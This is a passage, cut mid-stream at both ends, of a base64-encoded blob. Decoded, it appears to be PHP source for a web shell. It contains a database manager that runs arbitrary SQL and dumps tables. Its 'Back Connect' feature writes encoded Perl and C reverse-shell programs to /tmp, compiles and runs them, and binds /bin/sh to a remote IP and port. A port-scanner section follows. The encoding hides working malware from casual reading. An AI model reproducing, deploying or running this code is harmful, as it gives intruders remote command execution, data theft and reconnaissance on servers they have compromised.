kJCQkJCWlmICgkdikgewoJCQkJCQkJJERCLT5zcWxkdW1wKCR2LCAkZnApOwoJCQkJCQl9CgkJCQkJfQoJCQkJCWZjbG9zZSgkZnApOwoJCQkJCSRmaWxldXJsID0gc3RyX3JlcGxhY2UoU0FfUk9PVCwnJywkUFsnYmFrX3BhdGgnXSk7CgkJCQkJbSgnRGF0YWJhc2UgaGFzIGJhY2t1cCB0byA8YSBocmVmPSInLiRmaWxldXJsLiciIHRhcmdldD0iX2JsYW5rIj4nLiRQWydiYWtfcGF0aCddLic8L2E+Jyk7CgkJCQl9IGVsc2UgewoJCQkJCW0oJ0JhY2t1cCBmYWlsZWQnKTsKCQkJCX0KCQkJfSBlbHNlIHsKCQkJCUBvYl9lbmRfY2xlYW4oKTsKCQkJCSRmaWxlbmFtZSA9IGJhc2VuYW1lKCRkYm5hbWUuJy5zcWwnKTsKCQkJCWhlYWRlcignQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi91bmtub3duJyk7CgkJCQloZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPScuJGZpbGVuYW1lKTsKCQkJCWZvcmVhY2goJFBbJ2Jha190YWJsZSddIGFzICRrID0+ICR2KSB7CgkJCQkJaWYgKCR2KSB7CgkJCQkJCSREQi0+c3FsZHVtcCgkdik7CgkJCQkJfQoJCQkJfQoJCQkJZXhpdDsKCQkJfQoJCQkkREItPmNsb3NlKCk7CgkJfSBlbHNlIHsKCQkJbSgnUGxlYXNlIGNob29zZSB0aGUgdGFibGUnKTsKCQl9CgkJJGRvaW5nID0gJyc7Cgl9CgoJZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J01ZU1FMIE1hbmFnZXInLCAnbmFtZSc9PidkYmZvcm0nKSk7CgltYWtlaGlkZSgnYWN0JywnbXlzcWxhZG1pbicpOwoJbWFrZWhpZGUoJ2RvaW5nJywkZG9pbmcpOwoJbWFrZWhpZGUoJ2NoYXJzZXQnLCAkY2hhcnNldCk7CgltYWtlaGlkZSgndGFibGVuYW1lJywgJHRhYmxlbmFtZSk7CgltYWtlaGlkZSgnb3JkZXInLCAkb3JkZXIpOwoJcCgnPHA+Jyk7CglwKCdEQkhvc3Q6Jyk7CgltYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4nZGJob3N0Jywnc2l6ZSc9PjIwLCd2YWx1ZSc9PiRkYmhvc3QpKTsKCXAoJ0RCVXNlcjonKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidkYnVzZXInLCdzaXplJz0+MTUsJ3ZhbHVlJz0+JGRidXNlcikpOwoJcCgnREJQYXNzOicpOwoJbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J2RicGFzcycsJ3NpemUnPT4xNSwndmFsdWUnPT4kZGJwYXNzKSk7CgltYWtlaW5wdXQoYXJyYXkoJ3ZhbHVlJz0+J0Nvbm5lY3QnLCd0eXBlJz0+J3N1Ym1pdCcsJ2NsYXNzJz0+J2J0JykpOwoJcCgnPC9wPicpOwoKCWlmICgkZGJob3N0ICYmICRkYnVzZXIgJiYgaXNzZXQoJGRicGFzcykpIHsKCgkJLy8g5Yid5aeL5YyW5pWw5o2u5bqT57G7CgkJJERCID0gbmV3IERCX015U1FMOwoJCSREQi0+Y2hhcnNldGRiID0gJGNoYXJzZXRkYjsKCQkkREItPmNoYXJzZXQgPSAkY2hhcnNldDsKCQkkREItPmNvbm5lY3QoJGRiaG9zdCwgJGRidXNlciwgJGRicGFzcywgJGRibmFtZSk7CgoJCS8v6I635Y+W5pWw5o2u5bqT5L+h5oGvCgkJcCgnPHAgY2xhc3M9InJlZCI+TXlTUUwgJy4kREItPnZlcnNpb24oKS4nIHJ1bm5pbmcgaW4gJy4kZGJob3N0LicgYXMgJy4kZGJ1c2VyLidAJy4kZGJob3N0Lic8L3A+Jyk7CgkJJGhpZ2h2ZXIgPSAkREItPnZlcnNpb24oKSA+ICc0LjEnID8gMSA6IDA7CgoJCS8v6I635Y+W5pWw5o2u5bqTCgkJJHF1ZXJ5ID0gJERCLT5xdWVyeSgiU0hPVyBEQVRBQkFTRVMiKTsKCQkkZGJzID0gYXJyYXkoKTsKCQkkZGJzW10gPSAnLS0gU2VsZWN0IGEgZGF0YWJhc2UgLS0nOwoJCXdoaWxlKCRkYiA9ICREQi0+ZmV0Y2goJHF1ZXJ5KSkgewoJCQkkZGJzWyRkYlsnRGF0YWJhc2UnXV0gPSAkZGJbJ0RhdGFiYXNlJ107CgkJfQoJCW1ha2VzZWxlY3QoYXJyYXkoJ25hbWUnPT4nZGJuYW1lJywnb3B0aW9uJz0+JGRicywnc2VsZWN0ZWQnPT4kZGJuYW1lLCdvbmNoYW5nZSc9PidzZXRkYih0aGlzLm9wdGlvbnNbdGhpcy5zZWxlY3RlZEluZGV4XS52YWx1ZSknKSk7CgoJCWlmICgkZGJuYW1lKSB7CgkJCXAoJzxwPkN1cnJlbnQgZGFiYWJhc2U6IDxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0ZGIoXCcnLiRkYm5hbWUuJ1wnKTsiPicuJGRibmFtZS4nPC9hPicpOwoJCQlpZiAoJHRhYmxlbmFtZSkgewoJCQkJcCgnIHwgQ3VycmVudCBUYWJsZTogPGEgaHJlZj0iamF2YXNjcmlwdDpzZXR0YWJsZShcJycuJHRhYmxlbmFtZS4nXCcpOyI+Jy4kdGFibGVuYW1lLic8L2E+IFsgPGEgaHJlZj0iamF2YXNjcmlwdDpzZXR0YWJsZShcJycuJHRhYmxlbmFtZS4nXCcsIFwnc3RydWN0dXJlXCcpOyI+U3RydWN0dXJlPC9hPiBdJyk7CgkJCX0KCQkJcCgnPC9wPicpOwoKCQkJJHNxbF9xdWVyeSA9IGlzc2V0KCRQWydzcWxfcXVlcnknXSkgPyAkUFsnc3FsX3F1ZXJ5J10gOiAnJzsKCgkJCWlmICgkdGFibGVuYW1lICYmICEkc3FsX3F1ZXJ5KSB7CgkJCQkkc3FsX3F1ZXJ5ID0gIlNFTEVDVCAqIEZST00gJHRhYmxlbmFtZSBMSU1JVCAwLCAzMCI7CgkJCX0KCQkJaWYgKCR0YWJsZW5hbWUgJiYgJGRvaW5nID09ICdzdHJ1Y3R1cmUnKSB7CgkJCQkkc3FsX3F1ZXJ5ID0gIlNIT1cgRlVMTCBDT0xVTU5TIEZST00gJHRhYmxlbmFtZTtcbiI7CgkJCQkkc3FsX3F1ZXJ5IC49ICJTSE9XIElOREVYIEZST00gJHRhYmxlbmFtZTsiOwoJCQl9CgkJCXAoJzxwPjx0YWJsZSB3aWR0aD0iMjAwIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCI+PHRyPjx0ZCBjb2xzcGFuPSIyIj5SdW4gU1FMIHF1ZXJ5L3F1ZXJpZXMgb24gZGF0YWJhc2UgJy4kZGJuYW1lLic6PC90ZD48L3RyPjx0cj48dGQ+PHRleHRhcmVhIG5hbWU9InNxbF9xdWVyeSIgY2xhc3M9ImFyZWEiIHN0eWxlPSJ3aWR0aDo2MDBweDtoZWlnaHQ6NTBweDtvdmVyZmxvdzphdXRvOyI+Jy5odG1sc3BlY2lhbGNoYXJzKCRzcWxfcXVlcnksRU5UX1FVT1RFUykuJzwvdGV4dGFyZWE+PC90ZD48dGQgc3R5bGU9InBhZGRpbmc6MCA1cHg7Ij48aW5wdXQgY2xhc3M9ImJ0IiBvbmNsaWNrPSIkKFwnZG9pbmdcJykudmFsdWU9XCdcJyIgc3R5bGU9ImhlaWdodDo1MHB4OyIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iUXVlcnkiIC8+PC90ZD48L3RyPjwvdGFibGU+PC9wPicpOwoJCQlpZiAoJHNxbF9xdWVyeSkgewoJCQkJJHF1ZXJ5cyA9IEBleHBsb2RlKCc7Jywkc3FsX3F1ZXJ5KTsKCQkJCWZvcmVhY2goJHF1ZXJ5cyBhcyAkbnVtPT4kcXVlcnkpIHsKCQkJCQlpZiAoJHF1ZXJ5KSB7CgkJCQkJCXAoIjxwIGNsYXNzPVwicmVkIGJcIj5RdWVyeSN7JG51bX0gOiAiLmh0bWxzcGVjaWFsY2hhcnMoJHF1ZXJ5LEVOVF9RVU9URVMpLiI8L3A+Iik7CgkJCQkJCXN3aXRjaCgkREItPnF1ZXJ5X3JlcygkcXVlcnkpKQoJCQkJCQl7CgkJCQkJCQljYXNlIDA6CgkJCQkJCQkJcCgnPGgyPicuJERCLT5oYWx0KCdFcnJvcicpLic8L2gyPicpOwoJCQkJCQkJCWJyZWFrOwoJCQkJCQkJY2FzZSAxOgoJCQkJCQkJCSRyZXN1bHQgPSAkREItPnF1ZXJ5KCRxdWVyeSk7CgkJCQkJCQkJJHRhdG9sID0gJERCLT5udW1fcm93cygkcmVzdWx0KTsKCQkJCQkJCQlwKCc8dGFibGUgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMyIgY2VsbHNwYWNpbmc9IjAiPicpOwoJCQkJCQkJCXAoJzx0ciBjbGFzcz0iaGVhZCI+Jyk7CgkJCQkJCQkJJGZpZWxkbnVtID0gQG15c3FsX251bV9maWVsZHMoJHJlc3VsdCk7CgkJCQkJCQkJZm9yKCRpPTA7JGk8JGZpZWxkbnVtOyRpKyspewoJCQkJCQkJCQlwKCc8dGQgbm93cmFwPicuQG15c3FsX2ZpZWxkX25hbWUoJHJlc3VsdCwgJGkpLic8L3RkPicpOwoJCQkJCQkJCX0KCQkJCQkJCQlwKCc8L3RyPicpOwoKCQkJCQkJCQlpZiAoISR0YXRvbCkgewoJCQkJCQkJCQlwKCc8dHIgY2xhc3M9ImFsdDIiIG9ubW91c2VvdmVyPSJ0aGlzLmNsYXNzTmFtZT1cJ2ZvY3VzXCc7IiBvbm1vdXNlb3V0PSJ0aGlzLmNsYXNzTmFtZT1cJ2FsdDJcJzsiPjx0ZCBub3dyYXAgY29sc3Bhbj0iJy4kZmllbGRudW0uJyIgY2xhc3M9InJlZCBiIj5ObyByZWNvcmRzPC90ZD48L3RyPicpOwoJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCXdoaWxlKCRtbiA9ICREQi0+ZmV0Y2goJHJlc3VsdCkpewoJCQkJCQkJCQkJJHRoaXNiZyA9IGJnKCk7CgkJCQkJCQkJCQlwKCc8dHIgY2xhc3M9IicuJHRoaXNiZy4nIiBvbm1vdXNlb3Zlcj0idGhpcy5jbGFzc05hbWU9XCdmb2N1c1wnOyIgb25tb3VzZW91dD0idGhpcy5jbGFzc05hbWU9XCcnLiR0aGlzYmcuJ1wnOyI+Jyk7CgkJCQkJCQkJCQkvL+ivu+WPluiusOW9leeUqAoJCQkJCQkJCQkJZm9yZWFjaCgkbW4gYXMgJGtleT0+JGluc2lkZSl7CgkJCQkJCQkJCQkJcCgnPHRkIG5vd3JhcD4nLigoJGluc2lkZSA9PSBudWxsKSA/ICc8aT5udWxsPC9pPicgOiBodG1sX2NsZWFuKCRpbnNpZGUpKS4nPC90ZD4nKTsKCQkJCQkJCQkJCX0KCQkJCQkJCQkJCXAoJzwvdHI+Jyk7CgkJCQkJCQkJCQl1bnNldCgkYjEpOwoJCQkJCQkJCQl9CgkJCQkJCQkJfQoJCQkJCQkJCXAoJzwvdGFibGU+Jyk7CgkJCQkJCQkJYnJlYWs7CgkJCQkJCQljYXNlIDI6CgkJCQkJCQkJcCgnPGgyPkFmZmVjdGVkIFJvd3MgOiAnLiREQi0+YWZmZWN0ZWRfcm93cygpLic8L2gyPicpOwoJCQkJCQkJCWJyZWFrOwoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQl9IGVsc2UgewoJCQkJJHF1ZXJ5ID0gJERCLT5xdWVyeSgiU0hPVyBUQUJMRSBTVEFUVVMiKTsKCQkJCSR0YWJsZV9udW0gPSAkdGFibGVfcm93cyA9ICRkYXRhX3NpemUgPSAwOwoJCQkJJHRhYmxlZGIgPSBhcnJheSgpOwoJCQkJd2hpbGUoJHRhYmxlID0gJERCLT5mZXRjaCgkcXVlcnkpKSB7CgkJCQkJJGRhdGFfc2l6ZSA9ICRkYXRhX3NpemUgKyAkdGFibGVbJ0RhdGFfbGVuZ3RoJ107CgkJCQkJJHRhYmxlX3Jvd3MgPSAkdGFibGVfcm93cyArICR0YWJsZVsnUm93cyddOwoJCQkJCSR0YWJsZV9udW0rKzsKCQkJCQkkdGFibGVkYltdID0gJHRhYmxlOwoJCQkJfQoJCQkJJGRhdGFfc2l6ZSA9IHNpemVjb3VudCgkZGF0YV9zaXplKTsKCQkJCXVuc2V0KCR0YWJsZSk7CgkJCQlpZiAoY291bnQoJHRhYmxlZGIpKSB7CgkJCQkJaWYgKCRoaWdodmVyKSB7CgkJCQkJCSRkYl9lbmdpbmUgPSAkREItPmZldGNoKCREQi0+cXVlcnkoIlNIT1cgVkFSSUFCTEVTIExJS0UgJ3N0b3JhZ2VfZW5naW5lJzsiKSk7CgkJCQkJCSRkYl9jb2xsYXRpb24gPSAkREItPmZldGNoKCREQi0+cXVlcnkoIlNIT1cgVkFSSUFCTEVTIExJS0UgJ2NvbGxhdGlvbl9kYXRhYmFzZSc7IikpOwoJCQkJCX0KCQkJCQkkc29ydCA9IGFycmF5KCdOYW1lJywgMSk7CgkJCQkJaWYoJG9yZGVyKSB7CgkJCQkJCWlmKHByZWdfbWF0Y2goJyFzXyhbQS16X10rKV8oXGR7MX0pIScsICRvcmRlciwgJG1hdGNoKSkgewoJCQkJCQkJJHNvcnQgPSBhcnJheSgkbWF0Y2hbMV0sIChpbnQpJG1hdGNoWzJdKTsKCQkJCQkJfQoJCQkJCX0KCQkJCQl1c29ydCgkdGFibGVkYiwgJ2NtcCcpOwoJCQkJCXAoJzx0YWJsZSBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCIgaWQ9Imxpc3RzIj4nKTsKCQkJCQlwKCc8dHIgY2xhc3M9ImhlYWQiPicpOwoJCQkJCXAoJzx0ZCB3aWR0aD0iMiUiPjxpbnB1dCBuYW1lPSJjaGthbGwiIHZhbHVlPSJvbiIgdHlwZT0iY2hlY2tib3giIG9uY2xpY2s9ImNoZWNrYWxsKHRoaXMuZm9ybSkiIC8+PC90ZD4nKTsKCQkJCQlwKCc8dGQ+PGEgaHJlZj0iamF2YXNjcmlwdDpzZXRzb3J0KFwnc19OYW1lXycuKCRzb3J0WzFdPzA6MSkuJ1wnKTsiPk5hbWU8L2E+ICcuKCRvcmRlciA9PSAnc19OYW1lXzAnID8gJGRjaGFyIDogJycpLigkb3JkZXIgPT0gJ3NfTmFtZV8xJyB8fCAhJG9yZGVyID8gJHVjaGFyIDogJycpLic8L3RkPicpOwoJCQkJCXAoJzx0ZD48YSBocmVmPSJqYXZhc2NyaXB0OnNldHNvcnQoXCdzX1Jvd3NfJy4oJHNvcnRbMV0/MDoxKS4nXCcpOyI+Um93czwvYT4nLigkb3JkZXIgPT0gJ3NfUm93c18wJyA/ICRkY2hhciA6ICcnKS4oJG9yZGVyID09ICdzX1Jvd3NfMScgPyAkdWNoYXIgOiAnJykuJzwvdGQ+Jyk7CgkJCQkJcCgnPHRkPjxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0c29ydChcJ3NfRGF0YV9sZW5ndGhfJy4oJHNvcnRbMV0/MDoxKS4nXCcpOyI+RGF0YV9sZW5ndGg8L2E+Jy4oJG9yZGVyID09ICdzX0RhdGFfbGVuZ3RoXzAnID8gJGRjaGFyIDogJycpLigkb3JkZXIgPT0gJ3NfRGF0YV9sZW5ndGhfMScgPyAkdWNoYXIgOiAnJykuJzwvdGQ+Jyk7CgkJCQkJcCgnPHRkPjxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0c29ydChcJ3NfQ3JlYXRlX3RpbWVfJy4oJHNvcnRbMV0/MDoxKS4nXCcpOyI+Q3JlYXRlX3RpbWU8L2E+Jy4oJG9yZGVyID09ICdzX0NyZWF0ZV90aW1lXzAnID8gJGRjaGFyIDogJycpLigkb3JkZXIgPT0gJ3NfQ3JlYXRlX3RpbWVfMScgPyAkdWNoYXIgOiAnJykuJzwvdGQ+Jyk7CgkJCQkJcCgnPHRkPjxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0c29ydChcJ3NfVXBkYXRlX3RpbWVfJy4oJHNvcnRbMV0/MDoxKS4nXCcpOyI+VXBkYXRlX3RpbWU8L2E+Jy4oJG9yZGVyID09ICdzX1VwZGF0ZV90aW1lXzAnID8gJGRjaGFyIDogJycpLigkb3JkZXIgPT0gJ3NfVXBkYXRlX3RpbWVfMScgPyAkdWNoYXIgOiAnJykuJzwvdGQ+Jyk7CgkJCQkJaWYgKCRoaWdodmVyKSB7CgkJCQkJCXAoJzx0ZD5FbmdpbmU8L3RkPicpOwoJCQkJCQlwKCc8dGQ+Q29sbGF0aW9uPC90ZD4nKTsKCQkJCQl9CgkJCQkJcCgnPHRkPk90aGVyPC90ZD4nKTsKCQkJCQlwKCc8L3RyPicpOwoJCQkJCWZvcmVhY2ggKCR0YWJsZWRiIGFzICRrZXkgPT4gJHRhYmxlKSB7CgkJCQkJCSR0aGlzYmcgPSBiZygpOwoJCQkJCQlwKCc8dHIgY2xhc3M9IicuJHRoaXNiZy4nIiBvbm1vdXNlb3Zlcj0idGhpcy5jbGFzc05hbWU9XCdmb2N1c1wnOyIgb25tb3VzZW91dD0idGhpcy5jbGFzc05hbWU9XCcnLiR0aGlzYmcuJ1wnOyI+Jyk7CgkJCQkJCXAoJzx0ZCBhbGlnbj0iY2VudGVyIiB3aWR0aD0iMiUiPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0iYmFrX3RhYmxlW10iIHZhbHVlPSInLiR0YWJsZVsnTmFtZSddLiciIC8+PC90ZD4nKTsKCQkJCQkJcCgnPHRkPjxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0dGFibGUoXCcnLiR0YWJsZVsnTmFtZSddLidcJyk7Ij4nLiR0YWJsZVsnTmFtZSddLic8L2E+PC90ZD4nKTsKCQkJCQkJcCgnPHRkPicuJHRhYmxlWydSb3dzJ10uJyZuYnNwOzwvdGQ+Jyk7CgkJCQkJCXAoJzx0ZD4nLnNpemVjb3VudCgkdGFibGVbJ0RhdGFfbGVuZ3RoJ10pLic8L3RkPicpOwoJCQkJCQlwKCc8dGQ+Jy4kdGFibGVbJ0NyZWF0ZV90aW1lJ10uJyZuYnNwOzwvdGQ+Jyk7CgkJCQkJCXAoJzx0ZD4nLiR0YWJsZVsnVXBkYXRlX3RpbWUnXS4nJm5ic3A7PC90ZD4nKTsKCQkJCQkJaWYgKCRoaWdodmVyKSB7CgkJCQkJCQlwKCc8dGQ+Jy4kdGFibGVbJ0VuZ2luZSddLic8L3RkPicpOwoJCQkJCQkJcCgnPHRkPicuJHRhYmxlWydDb2xsYXRpb24nXS4nPC90ZD4nKTsKCQkJCQkJfQoJCQkJCQlwKCc8dGQ+PGEgaHJlZj0iamF2YXNjcmlwdDpzZXR0YWJsZShcJycuJHRhYmxlWydOYW1lJ10uJ1wnLCBcJ3N0cnVjdHVyZVwnKTsiPlN0cnVjdHVyZTwvYT48L3RkPicpOwoJCQkJCQlwKCc8L3RyPicpOwoJCQkJCX0KCQkJCQlwKCc8dHIgY2xhc3M9ImhlYWQiPicpOwoJCQkJCXAoJzx0ZCB3aWR0aD0iMiUiPiZuYnNwOzwvdGQ+Jyk7CgkJCQkJcCgnPHRkPicuJHRhYmxlX251bS4nIHRhYmxlKHMpPC90ZD4nKTsKCQkJCQlwKCc8dGQ+Jy4kdGFibGVfcm93cy4nPC90ZD4nKTsKCQkJCQlwKCc8dGQ+Jy4kZGF0YV9zaXplLic8L3RkPicpOwoJCQkJCXAoJzx0ZD4mbmJzcDs8L3RkPicpOwoJCQkJCXAoJzx0ZD4mbmJzcDs8L3RkPicpOwoJCQkJCWlmICgkaGlnaHZlcikgewoJCQkJCQlwKCc8dGQ+Jy4kZGJfZW5naW5lWydWYWx1ZSddLic8L3RkPicpOwoJCQkJCQlwKCc8dGQ+Jy4kZGJfY29sbGF0aW9uWydWYWx1ZSddLic8L3RkPicpOwoJCQkJCX0KCQkJCQlwKCc8dGQ+Jm5ic3A7PC90ZD4nKTsKCQkJCQlwKCc8L3RyPicpOwoJCQkJCXAoIjx0ciBjbGFzcz1cIiIuYmcoKS4iXCI+PHRkIGNvbHNwYW49XCIiLigkaGlnaHZlciA/IDkgOiA3KS4iXCI+PGlucHV0IG5hbWU9XCJzYXZlYXNmaWxlXCIgdmFsdWU9XCIxXCIgdHlwZT1cImNoZWNrYm94XCIgLz4gU2F2ZSBhcyBmaWxlIDxpbnB1dCBjbGFzcz1cImlucHV0XCIgbmFtZT1cImJha19wYXRoXCIgdmFsdWU9XCIiLlNBX1JPT1QuJGRibmFtZS4iLnNxbFwiIHR5cGU9XCJ0ZXh0XCIgc2l6ZT1cIjYwXCIgLz4gPGlucHV0IGNsYXNzPVwiYnRcIiB0eXBlPVwiYnV0dG9uXCIgdmFsdWU9XCJFeHBvcnQgc2VsZWN0aW9uIHRhYmxlXCIgb25jbGljaz1cIiQoJ2RvaW5nJykudmFsdWU9J2R1bXAnOyQoJ2RiZm9ybScpLnN1Ym1pdCgpO1wiIC8+PC90ZD48L3RyPiIpOwoJCQkJCXAoIjwvdGFibGU+Iik7CgkJCQl9IGVsc2UgewoJCQkJCXAoJzxwIGNsYXNzPSJyZWQgYiI+Tm8gdGFibGVzPC9wPicpOwoJCQkJfQoJCQkJJERCLT5mcmVlX3Jlc3VsdCgkcXVlcnkpOwoJCQl9CgkJfQoJCSREQi0+Y2xvc2UoKTsKCX0KCWZvcm1mb290KCk7Cn0vL2VuZCBteXNxbAoKZWxzZWlmICgkYWN0ID09ICdiYWNrY29ubmVjdCcpIHsKCgkhJHAyICYmICRwMiA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddOwoJISRwMyAmJiAkcDMgPSAnMTIzNDUnOwoJJHVzZWRiID0gYXJyYXkoJ3BlcmwnPT4ncGVybCcsJ2MnPT4nYycpOwoKCSRiYWNrX2Nvbm5lY3Q9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdVMjlqYTJWME93MEtKR050WkQwZ0lteDVibmdpT3cwS0pITjVjM1JsYlQwZ0oyVmphRzhnSW1CMWJtRnRaU0F0WVdBaU8yVmoiLgoJCSJhRzhnSW1CcFpHQWlPeTlpYVc0dmMyZ25PdzBLSkRBOUpHTnRaRHNOQ2lSMFlYSm5aWFE5SkVGU1IxWmJNRjA3RFFva2NHOXlkRDBrUVZKSFZsc3hYVHNOQ2lScFlXUmtjajFwYm1WMFgyRjBiMjRvSkhSIi4KCQkiaGNtZGxkQ2tnZkh3Z1pHbGxLQ0pGY25KdmNqb2dKQ0ZjYmlJcE93MEtKSEJoWkdSeVBYTnZZMnRoWkdSeVgybHVLQ1J3YjNKMExDQWthV0ZrWkhJcElIeDhJR1JwWlNnaVJYSnliM0k2SUNRaFhHNGlLVCIuCgkJInNOQ2lSd2NtOTBiejFuWlhSd2NtOTBiMko1Ym1GdFpTZ25kR053SnlrN0RRcHpiMk5yWlhRb1UwOURTMFZVTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2dKSEJ5YjNSdktTQjhmQ0JrYVdVb0kiLgoJCSJrVnljbTl5T2lBa0lWeHVJaWs3RFFwamIyNXVaV04wS0ZOUFEwdEZWQ3dnSkhCaFpHUnlLU0I4ZkNCa2FXVW9Ja1Z5Y205eU9pQWtJVnh1SWlrN0RRcHZjR1Z1S0ZOVVJFbE9MQ0FpUGlaVFQwTkxSVlFpIi4KCQkiS1RzTkNtOXdaVzRvVTFSRVQxVlVMQ0FpUGlaVFQwTkxSVlFpS1RzTkNtOXdaVzRvVTFSRVJWSlNMQ0FpUGlaVFQwTkxSVlFpS1RzTkNuTjVjM1JsYlNna2MzbHpkR1Z0S1RzTkNtTnNiM05sS0ZOVVJFbCIuCgkJIk9LVHNOQ21Oc2IzTmxLRk5VUkU5VlZDazdEUXBqYkc5elpTaFRWRVJGVWxJcE93PT0iOwoJJGJhY2tfY29ubmVjdF9jPSJJMmx1WTJ4MVpHVWdQSE4wWkdsdkxtZytEUW9qYVc1amJIVmtaU0E4YzNsekwzTnZZMnRsZEM1b1BnMEtJMmx1WTJ4MVpHVWdQRzVsZEdsdVpYUXZhVzR1YUQ0TkNtbHVkQyIuCgkJIkJ0WVdsdUtHbHVkQ0JoY21kakxDQmphR0Z5SUNwaGNtZDJXMTBwRFFwN0RRb2dhVzUwSUdaa093MEtJSE4wY25WamRDQnpiMk5yWVdSa2NsOXBiaUJ6YVc0N0RRb2dZMmhoY2lCeWJYTmJNakZkUFNKeWIiLgoJCSJTQXRaaUFpT3lBTkNpQmtZV1Z0YjI0b01Td3dLVHNOQ2lCemFXNHVjMmx1WDJaaGJXbHNlU0E5SUVGR1gwbE9SVlE3RFFvZ2MybHVMbk5wYmw5d2IzSjBJRDBnYUhSdmJuTW9ZWFJ2YVNoaGNtZDJXekpkIi4KCQkiS1NrN0RRb2djMmx1TG5OcGJsOWhaR1J5TG5OZllXUmtjaUE5SUdsdVpYUmZZV1JrY2loaGNtZDJXekZkS1RzZ0RRb2dZbnBsY204b1lYSm5kbHN4WFN4emRISnNaVzRvWVhKbmRsc3hYU2tyTVN0emRISiIuCgkJInNaVzRvWVhKbmRsc3lYU2twT3lBTkNpQm1aQ0E5SUhOdlkydGxkQ2hCUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z1NWQlFVazlVVDE5VVExQXBJRHNnRFFvZ2FXWWdLQ2hqYjI1dVpXTjBLR1prTEMiLgoJCSJBb2MzUnlkV04wSUhOdlkydGhaR1J5SUNvcElDWnphVzRzSUhOcGVtVnZaaWh6ZEhKMVkzUWdjMjlqYTJGa1pISXBLU2s4TUNrZ2V3MEtJQ0FnY0dWeWNtOXlLQ0piTFYwZ1kyOXVibVZqZENncElpazdEIi4KCQkiUW9nSUNCbGVHbDBLREFwT3cwS0lIME5DaUJ6ZEhKallYUW9jbTF6TENCaGNtZDJXekJkS1RzTkNpQnplWE4wWlcwb2NtMXpLVHNnSUEwS0lHUjFjRElvWm1Rc0lEQXBPdzBLSUdSMWNESW9abVFzSURFcCIuCgkJIk93MEtJR1IxY0RJb1ptUXNJRElwT3cwS0lHVjRaV05zS0NJdlltbHVMM05vSWl3aWMyZ2dMV2tpTENCT1ZVeE1LVHNOQ2lCamJHOXpaU2htWkNrN0lBMEtmUT09IjsKCglpZiAoJHAxID09ICdzdGFydCcgJiYgJHAyICYmICRwMyAmJiAkcDQpewoJCWlmICgkcDQgPT0gJ3BlcmwnKSB7CgkJCWNmKCcvdG1wL2FuZ2VsX2JjJywkYmFja19jb25uZWN0KTsKCQkJJHJlcyA9IGV4ZWN1dGUod2hpY2goJ3BlcmwnKS4iIC90bXAvYW5nZWxfYmMgIi4kcDIuIiAiLiRwMy4iICYiKTsKCQl9IGVsc2UgewoJCQljZignL3RtcC9hbmdlbF9iYy5jJywkYmFja19jb25uZWN0X2MpOwoJCQkkcmVzID0gZXhlY3V0ZSgnZ2NjIC1vIC90bXAvYW5nZWxfYmMgL3RtcC9hbmdlbF9iYy5jJyk7CgkJCUB1bmxpbmsoJy90bXAvYW5nZWxfYmMuYycpOwoJCQkkcmVzID0gZXhlY3V0ZSgiL3RtcC9hbmdlbF9iYyAiLiRwMi4iICIuJHAzLiIgJiIpOwoJCX0KCQltKCdOb3cgc2NyaXB0IHRyeSBjb25uZWN0IHRvICcuJHAyLic6Jy4kcDMuJyAuLi4nKTsKCX0KCglmb3JtaGVhZChhcnJheSgndGl0bGUnPT4nQmFjayBDb25uZWN0JywgJ29uc3VibWl0Jz0+J2coXCdiYWNrY29ubmVjdFwnLG51bGwsXCdzdGFydFwnLHRoaXMucDIudmFsdWUsdGhpcy5wMy52YWx1ZSx0aGlzLnA0LnZhbHVlKTtyZXR1cm4gZmFsc2U7JykpOwoJcCgnPHA+Jyk7CglwKCdZb3VyIElQOicpOwoJbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J3AyJywnc2l6ZSc9PjIwLCd2YWx1ZSc9PiRwMikpOwoJcCgnWW91ciBQb3J0OicpOwoJbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J3AzJywnc2l6ZSc9PjE1LCd2YWx1ZSc9PiRwMykpOwoJcCgnVXNlOicpOwoJbWFrZXNlbGVjdChhcnJheSgnbmFtZSc9PidwNCcsJ29wdGlvbic9PiR1c2VkYiwnc2VsZWN0ZWQnPT4kcDQpKTsKCW1ha2VpbnB1dChhcnJheSgndmFsdWUnPT4nU3RhcnQnLCd0eXBlJz0+J3N1Ym1pdCcsJ2NsYXNzJz0+J2J0JykpOwoJcCgnPC9wPicpOwoJZm9ybWZvb3QoKTsKfS8vZW5kCgplbHNlaWYgKCRhY3QgPT0gJ3BvcnRzY2FuJykgewoJISRwMiAmJiAkcDIgPSAnMTI3LjAuMC4xJzsKCSEkcDMgJiYgJHAzID0gJzIxLDgwLDEzNSwxMzksNDQ1LDE0MzMsMzMwNiwzMzg5LDU2MzEsNDM5NTgnOwoJZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J1BvcnQgU2NhbicsICdvbnN1Ym1pdCc9PidnKFwncG9ydHNjYW5cJyxudWxsLFwnc3RhcnRcJyx0aGlzLnAyLnZhbHVlLHRoaXMucDMudmFsdWUpO3JldHVybiBmYWxzZTsnKSk7CglwKCc8cD4nKTsKCXAoJ0lQOicpOwoJbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J3AyJywnc2l6ZSc9PjIwLCd2YWx1ZSc9PiRw